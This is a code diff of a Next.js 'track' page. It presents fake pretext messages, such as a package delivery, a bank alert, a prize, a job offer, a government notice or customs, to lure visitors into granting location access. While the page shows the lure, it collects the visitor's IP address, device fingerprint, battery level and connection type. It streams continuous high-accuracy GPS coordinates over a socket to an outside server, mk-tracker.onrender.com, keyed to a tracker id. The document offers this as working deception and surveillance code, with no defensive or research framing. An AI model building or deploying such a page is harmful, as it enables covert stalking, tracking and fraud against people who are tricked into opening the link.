@@ -1,210 +1,291 @@
-"use client";
-import { useEffect, useState, Suspense } from "react";
-import io from "socket.io-client";
-import { useSearchParams } from "next/navigation";
+'use client';
+import { useEffect, useState, Suspense, useRef } from 'react';
+import io from 'socket.io-client';
+import { useSearchParams } from 'next/navigation';
+import {
+  IconPackage,
+  IconShieldAlert,
+  IconAward,
+  IconBriefcase,
+  IconGovernment,
+  IconPlane,
+  IconPizza,
+  IconEdit
+} from '../components/Icons';
 
-const socket = io("https://mk-tracker.onrender.com");
-
-// Function to get IP address
-const getIPAddress = async () => {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error('Error fetching IP:', error);
-    return 'Unknown';
+const getTemplateIcon = (id, color = 'currentColor', size = 30) => {
+  switch (id) {
+    case 'delivery': return <IconPackage size={size} color={color} />;
+    case 'bank':     return <IconShieldAlert size={size} color={color} />;
+    case 'prize':    return <IconAward size={size} color={color} />;
+    case 'job':      return <IconBriefcase size={size} color={color} />;
+    case 'gov':      return <IconGovernment size={size} color={color} />;
+    case 'customs':  return <IconPlane size={size} color={color} />;
+    case 'food':     return <IconPizza size={size} color={color} />;
+    default:         return <IconEdit size={size} color={color} />;
   }
 };
 
-// Enhanced device info detection
-const getEnhancedDeviceInfo = () => {
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  
-  // Detect specific devices and browsers
-  let deviceType = 'Device';
-  let browser = 'Unknown Browser';
-  
-  // Device detection
-  if (/iPhone/.test(userAgent)) deviceType = 'iPhone';
-  else if (/iPad/.test(userAgent)) deviceType = 'iPad';
-  else if (/Android/.test(userAgent)) deviceType = 'Android Phone';
-  else if (/Mac/.test(platform)) deviceType = 'Mac Computer';
-  else if (/Win/.test(platform)) deviceType = 'Windows Computer';
-  else if (/Linux/.test(platform)) deviceType = 'Linux Computer';
-  
-  // Browser detection
-  if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) browser = 'Chrome';
-  else if (/Firefox/.test(userAgent)) browser = 'Firefox';
-  else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) browser = 'Safari';
-  else if (/Edg/.test(userAgent)) browser = 'Edge';
-  
+const socket = io('https://mk-tracker.onrender.com');
+
+const getIP = async () => {
+  try { const r = await fetch('https://api.ipify.org?format=json'); return (await r.json()).ip; }
+  catch { return 'Unknown'; }
+};
+
+const getDeviceInfo = () => {
+  const ua = navigator.userAgent, pl = navigator.platform;
+  let device = 'Device', browser = 'Unknown';
+  if (/iPhone/.test(ua)) device = 'iPhone';
+  else if (/iPad/.test(ua)) device = 'iPad';
+  else if (/Android/.test(ua)) device = 'Android';
+  else if (/Mac/.test(pl)) device = 'Mac';
+  else if (/Win/.test(pl)) device = 'Windows';
+  else if (/Linux/.test(pl)) device = 'Linux';
+  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+  else if (/Firefox/.test(ua)) browser = 'Firefox';
+  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+  else if (/Edg/.test(ua)) browser = 'Edge';
   return {
-    userAgent: userAgent,
-    platform: platform,
-    language: navigator.language,
-    screenSize: `${window.screen.width}x${window.screen.height}`,
+    userAgent: ua, platform: pl, language: navigator.language,
+    screenSize: `${window.screen.width}×${window.screen.height}`,
     timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    deviceType: deviceType,
-    browser: browser,
-    cores: navigator.hardwareConcurrency || 'Unknown',
-    memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown'
+    deviceType: device, browser,
+    cores: navigator.hardwareConcurrency || '?',
+    memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?',
   };
 };
 
-// Move the main tracking logic to a separate component
+const getBattery = async () => {
+  try { if (navigator.getBattery) { const b = await navigator.getBattery(); return Math.round(b.level * 100); } }
+  catch {} return undefined;
+};
+
+const getConnection = () => {
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) return `${(c.effectiveType || c.type || 'unknown').toUpperCase()}${c.downlink ? ` ${c.downlink}Mbps` : ''}`.trim();
+  } catch {} return undefined;
+};
+
+/* Theme colours for the target page (light page) */
+const THEMES = {
+  delivery: { color: '#2563eb', ring: '#dbeafe', bg: '#eff6ff', text: '#1e40af' },
+  bank:     { color: '#d97706', ring: '#fef3c7', bg: '#fffbeb', text: '#92400e' },
+  prize:    { color: '#b45309', ring: '#fef3c7', bg: '#fffbeb', text: '#78350f' },
+  job:      { color: '#059669', ring: '#d1fae5', bg: '#ecfdf5', text: '#065f46' },
+  gov:      { color: '#4f46e5', ring: '#e0e7ff', bg: '#eef2ff', text: '#3730a3' },
+  customs:  { color: '#7c3aed', ring: '#ede9fe', bg: '#f5f3ff', text: '#4c1d95' },
+  food:     { color: '#dc2626', ring: '#fee2e2', bg: '#fef2f2', text: '#991b1b' },
+  custom:   { color: '#4f46e5', ring: '#e0e7ff', bg: '#eef2ff', text: '#3730a3' },
+};
+
+function Dots({ color }) {
+  return (
+    <div style={{ display: 'flex', justifyContent: 'center', gap: 7 }}>
+      {[0,1,2].map(i => (
+        <div key={i} style={{
+          width: 8, height: 8, borderRadius: '50%', background: color,
+          animation: `bk ${1.4 + i * 0.15}s ${i * 0.15}s infinite ease-in-out`,
+        }} />
+      ))}
+    </div>
+  );
+}
+
 function TrackContent() {
-  const searchParams = useSearchParams();
-  const trackerId = searchParams.get("id") || "default123";
-  const [dots, setDots] = useState("");
+  const params   = useSearchParams();
+  const trackerId = params.get('id') || 'default';
+  const msgParam  = params.get('msg');
+
+  const msg = (() => {
+    if (!msgParam) return null;
+    try { return JSON.parse(decodeURIComponent(atob(msgParam))); }
+    catch { return null; }
+  })();
+
+  const themeKey = msg?.theme || 'delivery';
+  const theme = THEMES[themeKey] || THEMES.delivery;
+  const iconKey = msg?.icon || 'delivery';
+  const title = msg?.title || 'Your package is arriving today';
+  const body  = msg?.body  || 'A parcel has been dispatched to your address. Please confirm your location so our driver can find you.';
+  const cta   = msg?.cta   || 'Confirm My Location';
+
+  const [status, setStatus] = useState('init'); // init | waiting | active | error
+  const [dots,   setDots]   = useState('');
+  const sent = useRef(false);
 
   useEffect(() => {
-    // Animate the dots
-    const interval = setInterval(() => {
-      setDots(prev => prev.length >= 3 ? "" : prev + ".");
-    }, 500);
-
-    return () => clearInterval(interval);
+    const iv = setInterval(() => setDots(p => p.length >= 3 ? '' : p + '.'), 500);
+    return () => clearInterval(iv);
   }, []);
 
   useEffect(() => {
-    const initializeTracking = async () => {
-      const deviceInfo = getEnhancedDeviceInfo();
-      const ipAddress = await getIPAddress();
-      
-      // Send enhanced device info with IP
-      socket.emit("join_tracker", { 
-        tracker_id: trackerId,
-        deviceInfo: {
-          ...deviceInfo,
-          ipAddress: ipAddress
-        }
-      });
+    const run = async () => {
+      const di  = getDeviceInfo();
+      const ip  = await getIP();
+      const bat = await getBattery();
+      const con = getConnection();
 
-      if ("geolocation" in navigator) {
-        const options = {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 5000,
-        };
+      socket.emit('join_tracker', { tracker_id: trackerId, deviceInfo: { ...di, ipAddress: ip } });
+      setStatus('waiting');
 
-        const watchId = navigator.geolocation.watchPosition(
-          (pos) => {
-            const {
-              latitude,
-              longitude,
-              accuracy,
-              speed,
-              heading,
-              timestamp
-            } = pos.coords;
+      if (!('geolocation' in navigator)) { setStatus('error'); return; }
 
-            socket.emit("update_location", {
-              tracker_id: trackerId,
-              lat: latitude,
-              lng: longitude,
-              accuracy: accuracy,
-              speed: speed || null,
-              heading: heading || null,
-              timestamp: timestamp
-            });
-          },
-          (err) => {
-            console.error("❌ Geolocation error:", err);
-            const getFallbackPosition = () => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                  const { latitude, longitude, accuracy } = pos.coords;
-                  socket.emit("update_location", {
-                    tracker_id: trackerId,
-                    lat: latitude,
-                    lng: longitude,
-                    accuracy: accuracy
-                  });
-                },
-                null,
-                options
-              );
-            };
-            const fallbackInterval = setInterval(getFallbackPosition, 2000);
-            return () => clearInterval(fallbackInterval);
-          },
-          options
-        );
-
-        return () => {
-          navigator.geolocation.clearWatch(watchId);
-        };
-      }
+      const opts = { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 };
+      const wid  = navigator.geolocation.watchPosition(
+        pos => {
+          sent.current = true;
+          setStatus('active');
+          socket.emit('update_location', {
+            tracker_id: trackerId,
+            lat: pos.coords.latitude, lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            speed: pos.coords.speed || null,
+            heading: pos.coords.heading || null,
+            timestamp: pos.coords.timestamp,
+            battery: bat, connection: con,
+          });
+        },
+        () => {
+          if (sent.current) return;
+          setStatus('error');
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              sent.current = true;
+              setStatus('active');
+              socket.emit('update_location', {
+                tracker_id: trackerId,
+                lat: pos.coords.latitude, lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                battery: bat, connection: con,
+              });
+            }, null, { ...opts, enableHighAccuracy: false }
+          );
+        }, opts
+      );
+      return () => navigator.geolocation.clearWatch(wid);
     };
-
-    initializeTracking();
+    run();
   }, [trackerId]);
 
   return (
-    <div className="flex h-screen items-center justify-center bg-gray-50 px-4">
-      <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-gray-200 p-8 text-center">
-        {/* Package Icon */}
-        <div className="w-20 h-20 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-6">
-          <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
-          </svg>
-        </div>
+    <div style={{
+      minHeight: '100vh', background: '#f9fafb',
+      display: 'flex', alignItems: 'center', justifyContent: 'center',
+      padding: 20, fontFamily: "'Inter', -apple-system, sans-serif",
+    }}>
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        @keyframes bk { 0%,80%,100% { transform:translateY(0);opacity:.35; } 40% { transform:translateY(-7px);opacity:1; } }
+        @keyframes ring { 0%{transform:scale(1);opacity:.6} 100%{transform:scale(1.7);opacity:0} }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+        @keyframes spin { to{transform:rotate(360deg)} }
+      `}</style>
 
-        {/* Main Message */}
-        <h2 className="text-2xl font-bold text-gray-900 mb-3">
-          Surprise Delivery! 🎁
-        </h2>
-        
-        <p className="text-gray-600 mb-2">
-          Your friend ordered you a special package!
-        </p>
-        
-        <p className="text-gray-600 mb-6">
-          Please keep this page open to confirm your location for delivery.
-        </p>
+      <div style={{
+        width: '100%', maxWidth: 360,
+        background: 'white', borderRadius: 20,
+        boxShadow: '0 2px 16px rgba(0,0,0,.07), 0 1px 4px rgba(0,0,0,.05)',
+        overflow: 'hidden',
+      }}>
+        {/* Thin top bar */}
+        <div style={{ height: 3, background: theme.color }} />
 
-        {/* Loading Animation */}
-        <div className="flex items-center justify-center gap-3 text-blue-600 mb-4">
-          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce"></div>
-          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: "0.1s" }}></div>
-          <div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
-        </div>
+        <div style={{ padding: '36px 28px 28px' }}>
+          {/* Icon with ring on active */}
+          <div style={{ position: 'relative', width: 72, height: 72, margin: '0 auto 24px' }}>
+            {status === 'active' && (
+              <div style={{
+                position: 'absolute', inset: -10, borderRadius: '50%',
+                border: `2px solid ${theme.color}`,
+                animation: 'ring 2s ease-out infinite',
+              }} />
+            )}
+            <div style={{
+              width: 72, height: 72, borderRadius: 17,
+              background: theme.bg, border: `1px solid ${theme.ring}`,
+              display: 'flex', alignItems: 'center', justifyContent: 'center',
+              position: 'relative',
+            }}>
+              {getTemplateIcon(iconKey, theme.color, 32)}
+            </div>
+          </div>
 
-        {/* Status Message */}
-        <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
-          <p className="text-sm text-blue-800 font-medium">
-            Confirming your location{dots}
+          <h1 style={{ fontSize: 20, fontWeight: 700, color: '#111827', textAlign: 'center', marginBottom: 10, lineHeight: 1.3 }}>
+            {title}
+          </h1>
+          <p style={{ fontSize: 13, color: '#6b7280', textAlign: 'center', lineHeight: 1.65, marginBottom: 24 }}>
+            {body}
           </p>
-          <p className="text-xs text-blue-600 mt-1">
-            Delivery agent will arrive soon!
-          </p>
+
+          {/* Status card */}
+          <div style={{ background: theme.bg, border: `1px solid ${theme.ring}`, borderRadius: 12, padding: '18px 16px' }}>
+            {status === 'init' && (
+              <div style={{ textAlign: 'center' }}>
+                <div style={{ width: 20, height: 20, border: `2px solid ${theme.ring}`, borderTopColor: theme.color, borderRadius: '50%', animation: 'spin .7s linear infinite', margin: '0 auto 8px' }} />
+                <div style={{ fontSize: 12, color: theme.text, fontWeight: 500 }}>Initialising…</div>
+              </div>
+            )}
+
+            {status === 'waiting' && (
+              <div style={{ textAlign: 'center' }}>
+                <div style={{ fontSize: 13, fontWeight: 600, color: theme.text, marginBottom: 12 }}>{cta}</div>
+                <Dots color={theme.color} />
+                <div style={{ fontSize: 11, color: '#9ca3af', marginTop: 10 }}>Allow location access when prompted</div>
+              </div>
+            )}
+
+            {status === 'active' && (
+              <div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
+                  <div style={{
+                    width: 8, height: 8, borderRadius: '50%',
+                    background: '#22c55e', animation: 'pulse 1.5s infinite',
+                  }} />
+                  <span style={{ fontSize: 12, fontWeight: 600, color: '#15803d' }}>Location confirmed</span>
+                </div>
+                <div style={{ fontSize: 11, color: '#9ca3af', marginBottom: 12, lineHeight: 1.5 }}>
+                  Keep this page open. {"You'll"} receive a notification when ready.
+                </div>
+                <Dots color={theme.color} />
+              </div>
+            )}
+
+            {status === 'error' && (
+              <div style={{ textAlign: 'center' }}>
+                <div style={{ fontSize: 13, fontWeight: 600, color: '#b91c1c', marginBottom: 4 }}>Location access required</div>
+                <div style={{ fontSize: 11, color: '#9ca3af', lineHeight: 1.5 }}>
+                  Enable location in your browser settings and reload.
+                </div>
+              </div>
+            )}
+          </div>
+
+          {status === 'error' && (
+            <button onClick={() => window.location.reload()} style={{
+              width: '100%', marginTop: 12, padding: '11px',
+              background: theme.color, border: 'none', borderRadius: 10,
+              color: 'white', fontSize: 13, fontWeight: 600, cursor: 'pointer',
+            }}>
+              Try Again
+            </button>
+          )}
         </div>
 
-        {/* Fun Note */}
-        <p className="text-xs text-gray-500 mt-6">
-          Keep this page open until delivery is complete
-        </p>
+        <div style={{ padding: '0 28px 20px', textAlign: 'center' }}>
+          <p style={{ fontSize: 11, color: '#d1d5db' }}>Keep this page open until complete</p>
+        </div>
       </div>
     </div>
   );
 }
 
-// Main component with Suspense boundary
 export default function Track() {
   return (
     <Suspense fallback={
-      <div className="flex h-screen items-center justify-center bg-gray-50 px-4">
-        <div className="max-w-md w-full bg-white rounded-2xl shadow-sm border border-gray-200 p-8 text-center">
-          <div className="w-20 h-20 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-6">
-            <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
-            </svg>
-          </div>
-          <h2 className="text-xl font-bold text-gray-900 mb-3">Loading...</h2>
-          <p className="text-gray-600">Preparing your delivery tracking</p>
-        </div>
+      <div style={{ minHeight: '100vh', background: '#f9fafb', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+        <div style={{ width: 32, height: 32, border: '3px solid #e5e7eb', borderTopColor: '#6366f1', borderRadius: '50%', animation: 'spin .7s linear infinite' }} />
       </div>
     }>
       <TrackContent />
